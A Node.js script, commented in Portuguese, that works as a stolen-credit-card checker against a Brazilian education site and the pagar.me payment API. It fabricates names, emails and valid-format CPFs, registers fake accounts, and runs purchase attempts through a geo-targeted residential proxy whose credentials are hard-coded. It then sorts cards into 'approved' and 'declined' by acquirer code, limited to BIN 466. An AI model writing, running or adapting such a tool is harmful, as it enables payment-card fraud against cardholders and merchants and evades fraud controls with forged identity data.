const axios = require('axios');
const chalk = require('chalk');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { faker } = require('@faker-js/faker'); // Biblioteca atualizada para gerar dados falsos
const cpf = require('cpf');                  // Biblioteca para gerar CPFs válidos

// Função para gerar um nome completo aleatório
function gerarNomeCompleto() {
    const primeiroNome = faker.person.firstName();
    const sobrenome = faker.person.lastName();
    return `${primeiroNome} ${sobrenome}`;
}

// Função para gerar um e-mail aleatório
function gerarEmail(nomeCompleto) {
    const nomePartes = nomeCompleto.toLowerCase().split(' ');
    const email = `${nomePartes[0]}.${nomePartes[1]}@exemplo.com`;
    return email;
}

// Função para gerar um CPF aleatório válido
function gerarCPF() {
    return cpf.generate()//.replace(/[.-]/g, '');  // Gera um CPF válido
}

// Função para gerar um número de telefone aleatório
function gerarTelefone() {
    const ddd = faker.number.int({ min: 11, max: 99 }); // DDD aleatório
    const numero = faker.phone.number('9####-####');    // Formato de celular
    return `(${ddd}) ${numero}`;
}

// Função para gerar todas as informações
function gerarInformacoes() {
    const nomeCompleto = gerarNomeCompleto();
    const email = gerarEmail(nomeCompleto);
    const documentoCPF = gerarCPF();
    const telefone = gerarTelefone();

    return {
        nome: nomeCompleto,
        email: email,
        cpf: documentoCPF,
        telefone: telefone
    };
}

// Gerar e exibir informações
//console.log(dadosGerados);
// Configuração do proxy
const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: '7k3kq7y3uy6mvnv-country-br-state-saopaulo',
        password: 'r59gbzdezj66gly'
    }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);
//const proxyCredentials = '2BBmmf8kVHfpGMzO:H8h2PGjZJhxX2g7Q_country-br,us_streaming-1';
//const proxyHost = 'geo.iproyal.com';
//const proxyPort = 12321;
//
//const proxyAgent = new HttpsProxyAgent(`http://${proxyCredentials}@${proxyHost}:${proxyPort}`);
//// Exemplo de uso

// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
    const startTime = Date.now();  // Captura o tempo de início
    const dadosGerados = gerarInformacoes();
    //   let resolverCaptchaToken = await solveCaptcha();
    // console.log(resolverCaptchaToken)
    try {

        //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);



        const register = await axios.post(
            'https://api.bioexplica.com.br/api/aluno',
            {
                "nome": dadosGerados.nome,
                "telefone": "(91) 92872-3743",
                "email": dadosGerados.email,
                "senha": "Karma0101@"
            },
            {
                headers: {
                    'Host': 'api.bioexplica.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'content-type': 'application/json;charset=UTF-8',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://aluno.bioexplica.com.br',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://aluno.bioexplica.com.br/',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                httpsAgent: proxyAgent,
            }
        );

        //   console.log(response.data)


        const tokenCard = await axios.post(
            'https://api.pagar.me/core/v5/tokens?appId=pk_voMDQQSogc6RDwWk',
            {
                "card": {
                    "number": numberGG,
                    "holder_name": dadosGerados.nome,
                    "exp_month": Number(monthGG),
                    "exp_year": Number(yearGG),
                    "cvv": cvvGG
                },
                "type": "card"
            },
            {
                headers: {
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Connection': 'keep-alive',
                    'Host': 'api.pagar.me',
                    'Origin': 'https://aluno.bioexplica.com.br',
                    'Referer': 'https://aluno.bioexplica.com.br/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'accept': 'application/json',
                    'content-type': 'application/json'
                },
                httpsAgent: proxyAgent
            })
        //    console.log(tokenCard.data);
        const createPayment = await axios.post(
            'https://api.bioexplica.com.br/api/pagamento/createpayment',
            {
                "idCadastroAluno": register.data.aluno.id,
                "cardHash": tokenCard.data.id,
                "planSelected": {
                    "id": 5,
                    "nome": "12 meses",
                    "valor": "269.00",
                    "valor_desconto": "0.00",
                    "parcelas": 12,
                    "tempo": 12,
                    "ordem": 3,
                    "gratis": 0,
                    "ativo": 1,
                    "destaque": 0,
                    "descricao": null,
                    "deletado": 0,
                    "data_cadastro": "2016-01-06 14:18:21"
                },
                "senha": "",
                "paymentType": "creditcard",
                "card_installments": 1,
                "cpf": dadosGerados.cpf,
                "telefone": "(91) 98415-5843",
                "cupom": ""
            },
            {
                headers: {
                    'accept': 'application/json,',
                    'Accept-Encoding': 'utf-8',
                    'Content-Type': 'application/json',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://aluno.bioexplica.com.br',
                    "priority": 'u=1, i',
                    "referer": 'https://aluno.bioexplica.com.br/',
                    "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
                },
                httpsAgent: proxyAgent,
                responseType: 'json'
            });
        // console.log(createPayment.data);
        let messageError = createPayment.data.charges[0].last_transaction.acquirer_return_code
        let messageError1 = createPayment.data.charges[0].last_transaction.acquirer_message
        if (messageError == '1045') {
            return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${messageError} |${messageError1} | [@im_Karmah] `));
        } else if (messageError == '1022') {
            return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${messageError} |${messageError1} 💸| [@im_Karmah]`));
        } else if (messageError == '0000') {
            return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${messageError} |${messageError1} R$ 120,00💸| [@im_Karmah]`));
        } else {
            return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${messageError} |${messageError1} - [@im_Karmah]`));
        }


    } catch (error) {
        //  console.log(error.status)
        //  if (!error.response) {
        //      return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido - [@im_Karmah]`))
        //  }
        //  let responseError = error.response.data.errors[0];
     //   console.log(error.response)
        //
        //  if (responseError.includes('Código de segurança inválido')) {
        //      return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1045|${responseError} | [@im_Karmah] `));
        //  }
        //  else if (responseError.includes('Saldo insuficiente')) {
        //      return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} 💸| [@im_Karmah]`));
        //  } else if (responseError.includes('Transação não autorizada por violação de segurança')) {
        //      return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@im_Karmah]`));
        //  } else if (responseError.includes('aprovada')) {
        //      return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Transação aprovada1 💸| [@im_Karmah]`));
        //  } else if (responseError.includes('Número do cartão inválido')) {
        return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Número do cartão inválido | [@im_Karmah]`));
        //  } else {
        //      return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@im_Karmah]`));
        //  }
    }//
}

async function executeFlow(value) {
  try {

    const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
    const yearSplited = yearGG.split('20')[1];


    if (numberGG.startsWith("466")) {
   //   console.log("O cartão
   
      let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
      return respoonse

    } else {
      return `[Reprovada] ${numberGG}|${monthGG}|20${yearSplited}|${cvvGG} Retorno - AQUI SO É POSSIVEL TESTAR DA BIN 466 | [@im_Karmah]`;
    }

  } catch (error) {
    console.error('Erro no fluxo principal:', error);
  }
}

export default executeFlow
